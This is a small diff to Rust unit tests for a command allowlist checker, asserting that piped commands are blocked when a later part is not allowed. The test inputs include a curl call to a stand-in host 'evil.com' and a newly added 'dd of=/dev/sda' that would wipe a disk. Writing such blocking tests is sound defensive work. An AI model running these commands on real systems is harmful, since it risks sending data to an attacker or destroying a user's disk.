@@ -1647,7 +1647,7 @@ mod tests {
         assert!(p.is_command_allowed("cat file.txt | wc -l"));
         // Second command not in allowlist — blocked
         assert!(!p.is_command_allowed("ls | curl http://evil.com"));
-        assert!(!p.is_command_allowed("echo hello | python3 -"));
+        assert!(!p.is_command_allowed("echo hello | dd of=/dev/sda"));
     }
 
     #[test]
